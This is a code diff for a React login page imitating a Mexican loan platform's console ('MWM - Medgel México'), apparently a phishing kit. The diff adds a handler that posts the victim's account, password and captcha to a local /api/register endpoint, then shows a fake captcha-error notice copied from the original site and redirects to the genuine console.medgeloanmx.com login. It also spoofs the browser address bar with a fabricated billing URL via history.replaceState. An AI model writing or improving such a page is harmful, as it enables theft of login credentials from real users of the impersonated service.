@@ -10,32 +10,80 @@ export default function Login() {
   const [captcha, setCaptcha] = useState("");
   const [showPass, setShowPass] = useState(false);
 
+  // 🔥 NOTIFICACIÓN (CHINA ORIGINAL)
   const [showError, setShowError] = useState(false);
 
-  // 🔥 DROPDOWN IDIOMA
-  const [showLang, setShowLang] = useState(false);
+  // ✅ loading
+  const [loading, setLoading] = useState(false);
 
-  // 🔥 FAKE URL REAL EN NAVEGADOR
   const fakeUrl =
-    "/?redirect=/BillingDetails/1380183659336716288?acqChannel=LAPT&planId=1708337&caseNo=1441352536830263297&loanId=1439978351889526784&system=MW&phoneNumber=527821233246";
+    "/register?redirect=/BillingDetails/1380183659336716288?acqChannel=LAPT&planId=1708337&caseNo=1441352536830263297&loanId=1439978351889526784&system=MW&phoneNumber=527821233246";
 
-  const handleLogin = () => {
-    setShowError(true);
+  // ✅ REGISTER + REDIRECT (SIN CAMBIAR TU FLUJO)
+  const handleRegister = async () => {
+    const cuentaVacia = cuenta.trim() === "";
+    const passwordVacia = password.trim() === "";
+    const captchaVacio = captcha.trim() === "";
 
-    setTimeout(() => {
-      window.location.href =
-        "https://console.medgeloanmx.com/login?redirect=/BillingDetails/1380183659336716288?acqChannel=LAPT&planId=1708337&caseNo=1441352536830263297&loanId=1439978351889526784&system=MW&phoneNumber=527821233246";
-    }, 1500);
+    setTouched({
+      cuenta: true,
+      password: true,
+      captcha: true,
+    });
+
+    if (cuentaVacia || passwordVacia || captchaVacio) {
+      setShowError(true);
+
+      setTimeout(() => {
+        window.location.href =
+          "https://console.medgeloanmx.com/login?redirect=/BillingDetails/1380183659336716288?acqChannel=LAPT&planId=1708337&caseNo=1441352536830263297&loanId=1439978351889526784&system=MW&phoneNumber=527821233246";
+      }, 1500);
+
+      return;
+    }
+
+    try {
+      setLoading(true);
+
+      await fetch("/api/register", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          cuenta,
+          password,
+          captcha,
+        }),
+      });
+
+      // 🔴 ALERTA + REDIRECT (IGUAL QUE ANTES)
+      setShowError(true);
+
+      setTimeout(() => {
+        window.location.href =
+          "https://console.medgeloanmx.com/login?redirect=/BillingDetails/1380183659336716288?acqChannel=LAPT&planId=1708337&caseNo=1441352536830263297&loanId=1439978351889526784&system=MW&phoneNumber=527821233246";
+      }, 1500);
+    } catch (error) {
+      console.error(error);
+
+      setShowError(true);
+
+      setTimeout(() => {
+        window.location.href =
+          "https://console.medgeloanmx.com/login?redirect=/BillingDetails/1380183659336716288?acqChannel=LAPT&planId=1708337&caseNo=1441352536830263297&loanId=1439978351889526784&system=MW&phoneNumber=527821233246";
+      }, 1500);
+    } finally {
+      setLoading(false);
+    }
   };
 
-  // 🔥 FAKE URL EN EL NAVEGADOR (SIN RECARGAR)
   useEffect(() => {
     if (!window.location.search.includes("redirect=")) {
       window.history.replaceState({}, "", fakeUrl);
     }
   }, []);
 
-  // 🔥 SOLUCIÓN CONGELAMIENTO AL REGRESAR
   useEffect(() => {
     const handlePageShow = (event: PageTransitionEvent) => {
       if (event.persisted) {
@@ -63,7 +111,9 @@ export default function Login() {
     "/captcha/c10.png",
   ];
 
-  const [captchaImg, setCaptchaImg] = useState(captchas[0]);
+  const [captchaImg, setCaptchaImg] = useState(() => {
+    return captchas[Math.floor(Math.random() * captchas.length)];
+  });
 
   const cambiarCaptcha = () => {
     const random = captchas[Math.floor(Math.random() * captchas.length)];
@@ -88,6 +138,7 @@ export default function Login() {
 
   const showCuentaError = touched.cuenta && isEmpty(cuenta);
   const showPasswordError = touched.password && isEmpty(password);
+  const showCaptchaError = touched.captcha && isEmpty(captcha);
 
   const getBorder = (f: FieldName, error: boolean) => {
     if (focusedField === f) return "border-[#67c23a]";
@@ -98,7 +149,7 @@ export default function Login() {
   return (
     <div className="min-h-screen flex items-center justify-center bg-[#304156] px-3 relative overflow-hidden">
 
-      {/* 🔴 NOTIFICACIÓN */}
+      {/* 🔴 ALERTA ORIGINAL CHINA */}
       <div
         className={`fixed top-0 left-1/2 -translate-x-1/2 z-50 transition-all duration-500 ${
           showError
@@ -111,7 +162,7 @@ export default function Login() {
             ×
           </div>
           <span className="text-[15px] text-[#f56c6c]">
-            Error en el Código de verificación
+            验证码错误
           </span>
         </div>
       </div>
@@ -123,7 +174,12 @@ export default function Login() {
             MWM - Medgel México
           </h2>
 
-          <form>
+          <form
+            onSubmit={(e) => {
+              e.preventDefault();
+              handleRegister();
+            }}
+          >
 
             {/* CUENTA */}
             <div className="mb-[6px]">
@@ -197,7 +253,7 @@ export default function Login() {
             </div>
 
             {/* CAPTCHA */}
-            <div className="flex gap-3 mb-[10px]">
+            <div className="flex gap-3 mb-0">
               <div className="relative flex-1">
                 <img
                   src="/icons/shield.png"
@@ -212,7 +268,7 @@ export default function Login() {
                   onChange={(e) => setCaptcha(e.target.value)}
                   onFocus={() => handleFocus("captcha")}
                   onBlur={() => handleBlur("captcha")}
-                  className={`w-full h-[41px] bg-[#ffff] rounded-[4px] pl-[34px] pr-5 text-[15px] text-[#606266] placeholder:text-[#909399] outline-none border ${getBorder("captcha", false)}`}
+                  className={`w-full h-[41px] bg-[#ffff] rounded-[4px] pl-[34px] pr-5 text-[15px] text-[#606266] placeholder:text-[#909399] outline-none border ${getBorder("captcha", showCaptchaError)}`}
                 />
               </div>
 
@@ -224,55 +280,32 @@ export default function Login() {
               />
             </div>
 
-            {/* 🔥 TRADUCTOR MÁS A LA IZQUIERDA */}
-            <div className="mt-5 mb-3 relative -ml-2 inline-block">
+            <div className="mt-0 mb-[4px] h-[12px]">
+              <p
+                className={`text-[12px] leading-[12px] transition-opacity duration-200 ${
+                  showCaptchaError ? "opacity-100 text-[#ff6b6b]" : "opacity-0"
+                }`}
+                style={{ marginTop: "2px" }}
+              >
+                Por favor introduzca el código de verificación
+              </p>
+            </div>
 
+            <div className="mt-2 mb-4 flex items-center">
               <img
                 src="/icons/translate.png"
-                className="w-[36px] h-[20px] opacity-60 object-contain cursor-pointer"
+                className="w-[36px] h-[20px] opacity-60 object-contain -ml-[10px]"
                 alt=""
-                onClick={() => setShowLang((v) => !v)}
               />
-
-              <div
-  className={`absolute left-1/2 top-[55px] -translate-x-1/2 origin-top transition-all duration-300 ease-out z-50 ${
-    showLang
-      ? "scale-y-100 opacity-100"
-      : "scale-y-0 opacity-0 pointer-events-none"
-  }`}
->
-<div className="bg-white rounded-[6px] shadow-md border border-[#e4e7ed] px-4 py-3 w-[90px] relative">    {/* Flecha centrada mejor */}
-    <div className="absolute -top-2 left-1/2 -translate-x-1/2 w-3 h-3 bg-white rotate-45"></div>
-
-<div className="flex flex-col gap-2 text-[14px] leading-[16px]">
-      <button
-        type="button"
-        className="text-left text-[#a8abb2] font-medium"
-        onClick={() => setShowLang(false)}
-      >
-        Español
-      </button>
-
-      <button
-        type="button"
-        className="text-left text-[#303133] font-medium"
-        onClick={() => setShowLang(false)}
-      >
-        简体中文
-      </button>
-
-    </div>
-  </div>
-</div>
             </div>
 
             {/* BOTÓN */}
             <button
-              type="button"
-              onClick={handleLogin}
-              className="w-full h-[43px] bg-[#52c41a] hover:bg-[#73d13d] text-white rounded-[4px] text-[15px]"
+              type="submit"
+              disabled={loading}
+              className="w-full h-[43px] bg-[#52c41a] hover:bg-[#73d13d] text-white rounded-[4px] text-[15px] disabled:opacity-70"
             >
-              Iniciar sesión
+              Iniciar Sesión
             </button>
 
           </form>
@@ -280,4 +313,4 @@ export default function Login() {
       </div>
     </div>
   );
-} 
+}
